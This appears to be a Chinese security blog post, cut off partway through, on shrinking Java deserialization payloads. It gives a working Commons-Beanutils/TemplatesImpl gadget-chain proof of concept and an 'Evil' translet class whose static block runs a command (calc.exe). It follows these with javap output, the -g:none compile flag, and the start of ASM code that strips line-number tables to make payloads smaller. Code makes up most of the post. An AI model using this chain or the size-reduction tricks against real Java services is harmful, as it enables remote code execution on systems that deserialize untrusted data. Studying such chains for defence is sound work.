@@ -1,0 +1,627 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  
+  <script>window.icon_font = '4552607_tq6stt6tcg';window.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};</script>
+  
+  
+  <title>
+    
+    Aiyakami的博客
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_tq6stt6tcg.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+  
+    <meta name="description" content="反序列化payload缩小技术测试环境JDK 8u65+CB 1.9.2打templatesImpl加载字节码 添加pom依赖 1234567&lt;dependencies&gt;    &lt;dependency&gt;        &lt;groupId&gt;commons-beanutils&lt;&#x2F;groupId&gt;        &lt;artifactId&gt;commo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Aiyakami的博客">
+<meta property="og:url" content="http://example.com/2025/04/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96payload%E7%BC%A9%E5%B0%8F%E6%8A%80%E6%9C%AFoutput/index.html">
+<meta property="og:site_name" content="Aiyakami的博客">
+<meta property="og:description" content="反序列化payload缩小技术测试环境JDK 8u65+CB 1.9.2打templatesImpl加载字节码 添加pom依赖 1234567&lt;dependencies&gt;    &lt;dependency&gt;        &lt;groupId&gt;commons-beanutils&lt;&#x2F;groupId&gt;        &lt;artifactId&gt;commo">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://aiyakami.github.io/about/11/network-asset-asynccode-20250412142848-aohoqrn.png">
+<meta property="og:image" content="https://aiyakami.github.io/about/11/network-asset-asynccode-20250412142848-2yhhjht.png">
+<meta property="og:image" content="https://aiyakami.github.io/about/11/network-asset-asynccode-20250412142849-k291a10.png">
+<meta property="og:image" content="https://aiyakami.github.io/about/11/network-asset-asynccode-20250412142849-ccbftnl.png">
+<meta property="og:image" content="https://aiyakami.github.io/about/11/network-asset-asynccode-20250412142849-raswymv.png">
+<meta property="og:image" content="https://aiyakami.github.io/about/11/network-asset-asynccode-20250412142849-n66l1a5.png">
+<meta property="og:image" content="https://aiyakami.github.io/about/11/network-asset-asynccode-20250412142850-210symo.png">
+<meta property="og:image" content="https://aiyakami.github.io/about/11/network-asset-asynccode-20250412142850-ibskvhx.png">
+<meta property="article:published_time" content="2025-04-12T06:33:54.343Z">
+<meta property="article:modified_time" content="2025-04-12T06:32:45.977Z">
+<meta property="article:author" content="aiyakami">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://aiyakami.github.io/about/11/network-asset-asynccode-20250412142848-aohoqrn.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Aiyakami的博客" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.0.1/dist/aos.css">
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/">首页</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/archives">归档</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/about">关于</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/friend">友链</a>
+      </span>
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">Aiyakami的博客</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+            <a href="/" id="subtitle">我无法原理那个明明什么都没做却一直期待着的自己</a>
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content">
+          
+          <section id="main"><article id="post-反序列化payload缩小技术output" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/04/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96payload%E7%BC%A9%E5%B0%8F%E6%8A%80%E6%9C%AFoutput/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-04-12T06:33:54.343Z" itemprop="datePublished">2025-04-12</time>
+    <time style="display: none;" id="post-update-time">2025-04-12</time>
+  </a>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="反序列化payload缩小技术"><a href="#反序列化payload缩小技术" class="headerlink" title="反序列化payload缩小技术"></a>反序列化payload缩小技术</h1><p>测试环境JDK 8u65+CB 1.9.2打templatesImpl加载字节码</p>
+<p>添加pom依赖</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-beanutils&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">1.9</span><span class="number">.2</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>
+
+<p>测试POC</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CBEXP</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\JavaClass\\TemplatesBytes.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;C&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, beanComparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        setFieldValue(beanComparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, templates&#125;);</span><br><span class="line">        serialize(queue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>测试需要加载的恶意字节码</p>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.<span class="property">sun</span>.<span class="property">org</span>.<span class="property">apache</span>.<span class="property">xalan</span>.<span class="property">internal</span>.<span class="property">xsltc</span>.<span class="property">DOM</span>;</span><br><span class="line"><span class="keyword">import</span> com.<span class="property">sun</span>.<span class="property">org</span>.<span class="property">apache</span>.<span class="property">xalan</span>.<span class="property">internal</span>.<span class="property">xsltc</span>.<span class="property">runtime</span>.<span class="property">AbstractTranslet</span>;</span><br><span class="line"><span class="keyword">import</span> com.<span class="property">sun</span>.<span class="property">org</span>.<span class="property">apache</span>.<span class="property">xml</span>.<span class="property">internal</span>.<span class="property">dtm</span>.<span class="property">DTMAxisIterator</span>;</span><br><span class="line"><span class="keyword">import</span> com.<span class="property">sun</span>.<span class="property">org</span>.<span class="property">apache</span>.<span class="property">xml</span>.<span class="property">internal</span>.<span class="property">serializer</span>.<span class="property">SerializationHandler</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">extends</span> <span class="title class_ inherited__">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="title class_">Runtime</span>.<span class="title function_">getRuntime</span>().<span class="title function_">exec</span>(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="title class_">Exception</span> e) &#123;</span><br><span class="line">            e.<span class="title function_">printStackTrace</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">void</span> <span class="title function_">transform</span>(<span class="params">DOM <span class="variable language_">document</span>, SerializationHandler[] handlers</span>) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">void</span> <span class="title function_">transform</span>(<span class="params">DOM <span class="variable language_">document</span>, DTMAxisIterator iterator, SerializationHandler handler</span>) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="从字节码层面优化"><a href="#从字节码层面优化" class="headerlink" title="从字节码层面优化"></a>从字节码层面优化</h2><p>javap 是 JDK 自带的 Java 类文件反汇编工具，用于查看 .class 文件的字节码信息。它可以显示类的方法、字段、常量池以及 JVM 指令等。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javap -c -l Evil.class</span><br><span class="line">-c 输出类中所有方法的 字节码指令（JVM 操作码）</span><br><span class="line">-l 输出局部变量信息</span><br></pre></td></tr></table></figure>
+
+<p>javap反汇编如下</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">public</span> <span class="string">class</span> <span class="string">org.example.Evil</span> <span class="string">extends</span> <span class="string">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span> &#123;</span><br><span class="line">  <span class="string">public</span> <span class="string">org.example.Evil();</span></span><br><span class="line">    <span class="attr">Code:</span></span><br><span class="line">       <span class="attr">0:</span> <span class="string">aload_0</span></span><br><span class="line">       <span class="attr">1:</span> <span class="string">invokespecial</span> <span class="comment">#1                  // Method com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet.&quot;&lt;init&gt;&quot;:()V</span></span><br><span class="line">       <span class="attr">4:</span> <span class="string">return</span></span><br><span class="line">    <span class="attr">LineNumberTable:</span></span><br><span class="line">      <span class="attr">line 8:</span> <span class="number">0</span></span><br><span class="line">    <span class="attr">LocalVariableTable:</span></span><br><span class="line">      <span class="string">Start</span>  <span class="string">Length</span>  <span class="string">Slot</span>  <span class="string">Name</span>   <span class="string">Signature</span></span><br><span class="line">          <span class="number">0</span>       <span class="number">5</span>     <span class="number">0</span>  <span class="string">this</span>   <span class="string">Lorg/example/Evil;</span></span><br><span class="line"></span><br><span class="line">  <span class="string">public</span> <span class="string">void</span> <span class="string">transform(com.sun.org.apache.xalan.internal.xsltc.DOM</span>, <span class="string">com.sun.org.apache.xml.internal.serializer.SerializationHandler</span>[]<span class="string">);</span></span><br><span class="line">    <span class="attr">Code:</span></span><br><span class="line">       <span class="attr">0:</span> <span class="string">return</span></span><br><span class="line">    <span class="attr">LineNumberTable:</span></span><br><span class="line">      <span class="attr">line 20:</span> <span class="number">0</span></span><br><span class="line">    <span class="attr">LocalVariableTable:</span></span><br><span class="line">      <span class="string">Start</span>  <span class="string">Length</span>  <span class="string">Slot</span>  <span class="string">Name</span>   <span class="string">Signature</span></span><br><span class="line">          <span class="number">0</span>       <span class="number">1</span>     <span class="number">0</span>  <span class="string">this</span>   <span class="string">Lorg/example/Evil;</span></span><br><span class="line">          <span class="number">0</span>       <span class="number">1</span>     <span class="number">1</span> <span class="string">document</span>   <span class="string">Lcom/sun/org/apache/xalan/internal/xsltc/DOM;</span></span><br><span class="line">          <span class="number">0</span>       <span class="number">1</span>     <span class="number">2</span> <span class="string">handlers</span>   [<span class="string">Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;</span></span><br><span class="line"></span><br><span class="line">  <span class="string">public</span> <span class="string">void</span> <span class="string">transform(com.sun.org.apache.xalan.internal.xsltc.DOM</span>, <span class="string">com.sun.org.apache.xml.internal.dtm.DTMAxisIterator</span>, <span class="string">com.sun.org.apache.xml.internal.serializer.SerializationHandler);</span></span><br><span class="line">    <span class="attr">Code:</span></span><br><span class="line">       <span class="attr">0:</span> <span class="string">return</span></span><br><span class="line">    <span class="attr">LineNumberTable:</span></span><br><span class="line">      <span class="attr">line 25:</span> <span class="number">0</span></span><br><span class="line">    <span class="attr">LocalVariableTable:</span></span><br><span class="line">      <span class="string">Start</span>  <span class="string">Length</span>  <span class="string">Slot</span>  <span class="string">Name</span>   <span class="string">Signature</span></span><br><span class="line">          <span class="number">0</span>       <span class="number">1</span>     <span class="number">0</span>  <span class="string">this</span>   <span class="string">Lorg/example/Evil;</span></span><br><span class="line">          <span class="number">0</span>       <span class="number">1</span>     <span class="number">1</span> <span class="string">document</span>   <span class="string">Lcom/sun/org/apache/xalan/internal/xsltc/DOM;</span></span><br><span class="line">          <span class="number">0</span>       <span class="number">1</span>     <span class="number">2</span> <span class="string">iterator</span>   <span class="string">Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;</span></span><br><span class="line">          <span class="number">0</span>       <span class="number">1</span>     <span class="number">3</span> <span class="string">handler</span>   <span class="string">Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;</span></span><br><span class="line"></span><br><span class="line">  <span class="string">static</span> &#123;&#125;<span class="string">;</span></span><br><span class="line">    <span class="attr">Code:</span></span><br><span class="line">       <span class="attr">0:</span> <span class="string">invokestatic</span>  <span class="comment">#2                  // Method java/lang/Runtime.getRuntime:()Ljava/lang/Runtime;</span></span><br><span class="line">       <span class="attr">3:</span> <span class="string">ldc</span>           <span class="comment">#3                  // String calc.exe</span></span><br><span class="line">       <span class="attr">5:</span> <span class="string">invokevirtual</span> <span class="comment">#4                  // Method java/lang/Runtime.exec:(Ljava/lang/String;)Ljava/lang/Process;</span></span><br><span class="line">       <span class="attr">8:</span> <span class="string">pop</span></span><br><span class="line">       <span class="attr">9:</span> <span class="string">goto</span>          <span class="number">17</span></span><br><span class="line">      <span class="attr">12:</span> <span class="string">astore_0</span></span><br><span class="line">      <span class="attr">13:</span> <span class="string">aload_0</span></span><br><span class="line">      <span class="attr">14:</span> <span class="string">invokevirtual</span> <span class="comment">#6                  // Method java/lang/Exception.printStackTrace:()V</span></span><br><span class="line">      <span class="attr">17:</span> <span class="string">return</span></span><br><span class="line">    <span class="attr">Exception table:</span></span><br><span class="line">       <span class="string">from</span>    <span class="string">to</span>  <span class="string">target</span> <span class="string">type</span></span><br><span class="line">           <span class="number">0</span>     <span class="number">9</span>    <span class="number">12</span>   <span class="string">Class</span> <span class="string">java/lang/Exception</span></span><br><span class="line">    <span class="attr">LineNumberTable:</span></span><br><span class="line">      <span class="attr">line 11:</span> <span class="number">0</span></span><br><span class="line">      <span class="attr">line 14:</span> <span class="number">9</span></span><br><span class="line">      <span class="attr">line 12:</span> <span class="number">12</span></span><br><span class="line">      <span class="attr">line 13:</span> <span class="number">13</span></span><br><span class="line">      <span class="attr">line 15:</span> <span class="number">17</span></span><br><span class="line">    <span class="attr">LocalVariableTable:</span></span><br><span class="line">      <span class="string">Start</span>  <span class="string">Length</span>  <span class="string">Slot</span>  <span class="string">Name</span>   <span class="string">Signature</span></span><br><span class="line">         <span class="number">13</span>       <span class="number">4</span>     <span class="number">0</span>     <span class="string">e</span>   <span class="string">Ljava/lang/Exception;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从上述观察可以发现，除了基本的字节码，还包括三个表，ExceptionTable，LocalVariableTable和LineNumberTable</p>
+<p><strong>ExceptionTable（异常表）</strong></p>
+<p>JVM 执行时，如果 from 到 to 之间的代码抛出 type 指定的异常，则跳转到 target</p>
+<p><strong>LocalVariableTable（局部变量表）</strong></p>
+<p>记录方法的局部变量信息，主要用于调试和反射，JVM 执行时不依赖它（貌似正常情况下也可以删掉它，不过存在反射逻辑时可能不能删，有待确定）</p>
+<p><strong>LineNumberTable（行号表）</strong></p>
+<p>使异常堆栈能显示行号，对生产环境非必需，默认编译时会保留，但可通过 <code>-g:none</code>​ 移除以减小 <code>.class</code>​ 文件体积</p>
+<h3 id="直接通过编译命令去除LineNumberTable"><a href="#直接通过编译命令去除LineNumberTable" class="headerlink" title="直接通过编译命令去除LineNumberTable"></a>直接通过编译命令去除LineNumberTable</h3><p>首先可以直接通过编译时<code>-g:none</code>​ 命令移除，在设置附件编译行中添加</p>
+<p>​<img src="https://aiyakami.github.io/about/11/network-asset-asynccode-20250412142848-aohoqrn.png">​</p>
+<p>可以发现明显的缩小了</p>
+<p>​<img src="https://aiyakami.github.io/about/11/network-asset-asynccode-20250412142848-2yhhjht.png">​</p>
+<p>POC正常运行</p>
+<p>​<img src="https://aiyakami.github.io/about/11/network-asset-asynccode-20250412142849-k291a10.png">​</p>
+<h3 id="基于ASM实现删除LINENUMBER"><a href="#基于ASM实现删除LINENUMBER" class="headerlink" title="基于ASM实现删除LINENUMBER"></a>基于ASM实现删除LINENUMBER</h3><p>ASM是一个Java字节码操作和分析框架，它可以直接操作字节码，允许开发者在不修改源代码的情况下动态修改类行为</p>
+<p>所需依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.ow2.asm<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>asm<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.ow2.asm<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>asm-commons<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>下面示例使用 <strong>ASM</strong> 删除字节码中的 LineNumberTable（行号表）可以通过访问 ClassVisitor 并忽略或移除相关属性来实现</p>
+<p><strong>具体步骤：</strong></p>
+<ul>
+<li>创建自定义 ClassVisitor，覆盖 visitMethod 方法，返回一个自定义的 MethodVisitor，用于处理方法体中的行号信息。</li>
+<li>实现步骤一的MethodVisitor 方法，在 MethodVisitor 中重写 visitLineNumber 方法，不调用父类方法，从而忽略行号信息</li>
+<li>实现最终处理类文件使用 ClassReader 和 ClassWriter 加载类文件并应用自定义的 ClassVisitor</li>
+</ul>
+<p>自定义 ClassVisitor实现</p>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.<span class="property">objectweb</span>.<span class="property">asm</span>.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoveLineNumberClassVisitor</span> <span class="keyword">extends</span> <span class="title class_ inherited__">ClassVisitor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">RemoveLineNumberClassVisitor</span>(<span class="title class_">ClassVisitor</span> cv) &#123;</span><br><span class="line">        <span class="variable language_">super</span>(<span class="title class_">Opcodes</span>.<span class="property">ASM9</span>, cv);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">MethodVisitor</span> <span class="title function_">visitMethod</span>(<span class="params">int access, <span class="built_in">String</span> name, <span class="built_in">String</span> descriptor, <span class="built_in">String</span> signature, <span class="built_in">String</span>[] exceptions</span>) &#123;</span><br><span class="line">        <span class="title class_">MethodVisitor</span> mv = <span class="variable language_">super</span>.<span class="title function_">visitMethod</span>(access, name, descriptor, signature, exceptions);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RemoveLineNumberMethodVisitor</span>(mv);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>自定义 MethodVisitor 实现</p>
